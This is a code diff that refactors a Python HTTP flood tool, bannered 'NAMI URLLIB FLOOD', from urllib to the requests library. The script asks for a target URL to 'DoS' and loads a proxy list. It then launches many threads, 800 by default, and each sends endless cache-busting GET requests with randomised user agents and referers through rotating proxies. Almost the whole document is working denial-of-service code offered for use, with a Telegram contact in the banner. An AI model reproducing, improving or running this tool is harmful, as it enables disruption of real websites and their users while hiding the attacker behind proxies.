@@ -1,4 +1,9 @@
-import urllib.request, os, threading, time, random, sys
+import os
+import threading
+import time
+import random
+import sys
+import requests
 from sys import stdout
 
 ref = [
@@ -141,38 +146,43 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
 			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
 			"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]
+
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0,9999)) + "=" + str(random.randint(0,9999))
+        self.url = url + "?" + str(random.randint(0, 9999)) + "=" + str(random.randint(0, 9999))
         self.num = number
-        self.headers = self.headers = {
-                'User-Agent': random.choice(ua),
-                'Referer': random.choice(ref),
-                'Accept-Encoding': 'gzip;q=0,deflate;q=0',
-                'Connection': 'Keep-Alive',
-                'Cache-Control': 'no-cache, no-store, must-revalidate',
-                'Cache-directive': 'no-cache',
-                'Pragma': 'no-cache',
-                'Upgrade-Insecure-Requests': '1',
-            }
+        self.headers = {
+            'User-Agent': random.choice(ua),
+            'Referer': random.choice(ref),
+            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
+            'Connection': 'Keep-Alive',
+            'Cache-Control': 'no-cache, no-store, must revalidate',
+            'Cache-directive': 'no-cache',
+            'Pragma': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
+        }
         self.Lock = threading.Lock()
         self.lista = lista
+
     def request(self):
         global N
         data = None
         if N >= (len(self.lista) - 1):
             N = 0
-        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
-        opener = urllib.request.build_opener(proxy)
-        urllib.request.install_opener(opener) 
-        req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req)
-        sys.stdout.write("Thread #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
+        proxy = {'http': self.lista[N]}
+        session = requests.Session()
+        session.proxies = proxy
+        try:
+            session.get(self.url, headers=self.headers)
+            sys.stdout.write("Thread #%4d | %4d\%d | Proxy@%s" % (self.num, N, len(self.lista), self.lista[N]))
+        except requests.exceptions.RequestException:
+            pass
+
     def run(self):
         global N
         self.Lock.acquire()
-        print ("Thread #%4d |"% (self.num))
+        print("Thread #%4d |" % (self.num))
         self.Lock.release()
         time.sleep(1)
         while True:
@@ -182,6 +192,8 @@ class Spammer(threading.Thread):
             except:
                 pass
         sys.exit(0)
+
+
 def title():
     stdout.write("                                                                                          \n")
     stdout.write("                   ""       (_)   (_)                  (_)                   \n")
@@ -190,50 +202,51 @@ def title():
     stdout.write("                   ""       (_)  (__)( )_( )(_) (_) (_)(_)                \n")
     stdout.write("                   ""       (_)   (_) (__)_)(_) (_) (_)(_)                \n")
     stdout.write("                   ""                                                \n")
-    stdout.write("             "            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+"║             NAMI URLLIB FLOOD             ""          ║\n")
-    stdout.write("             "+"║        ADDED NEW METHOD AND BYPASS    ""              ║\n")
-    stdout.write("             "+"║        Tele https://t.me/adfhjktewwyjqk   ""          ║\n")
-    stdout.write("             "+"╚═════════════════════════════════════════════════════╝\n")
+    stdout.write("             " + "        ══╦═════════════════════════════════╦══\n")
+    stdout.write("             " + "╔═════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("             " + "║             NAMI URLLIB FLOOD             ""          ║\n")
+    stdout.write("             " + "║        ADDED NEW METHOD AND BYPASS    ""              ║\n")
+    stdout.write("             " + "║        Tele https://t.me/adfhjktewwyjqk   ""          ║\n")
+    stdout.write("             " + "╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
-##############################################################################################
+
+
 class MainLoop():
-    
     def __init__(self):
         if os.name in ("nt", "dos", "ce"):
             title()
+
     def check_url(self, url):
-        if url[0]+url[1]+url[2]+url[3] == "www.":
-            url = "https://" + url
-        elif url[0]+url[1]+url[2]+url[3] == "http":
-            pass
-        else:
-            url = "https://" + url
+        if url[0:4] != "http":
+            url = "http://" + url
         return url
 
     def setup(self):
         global Close, Request, Tot_req
-        while True:        
+        while True:
             url = input('> Enter Url to DoS: ')
             url = self.check_url(url)
             try:
-                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
-                response = urllib.request.urlopen(req)
-                break
-            except:
-                print ('> Could not open specified url.')
-        while True:            
+                req = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
+                if req.status_code == 200:
+                    break
+                else:
+                    print('> Could not open specified url.')
+            except requests.exceptions.RequestException:
+                print('> Could not open specified url.')
+
+        while True:
             try:
                 l = str(input('> Enter the list of proxy: '))
-                in_file = open(l,"r")
+                in_file = open(l, "r")
                 lista = []
                 for i in in_file:
                     lista.append(i.split("/n")[0])
                 break
             except:
-                print ('Error to read file.')
-        while True:                
+                print('Error reading file.')
+
+        while True:
             try:
                 num_threads = int(input('> Enter the number of thread [800]: '))
             except:
@@ -242,7 +255,8 @@ class MainLoop():
 
         for i in range(num_threads):
             Spammer(url, i + 1, lista).start()
-        
+
+
 if __name__ == '__main__':
     N = 0
     b = MainLoop()
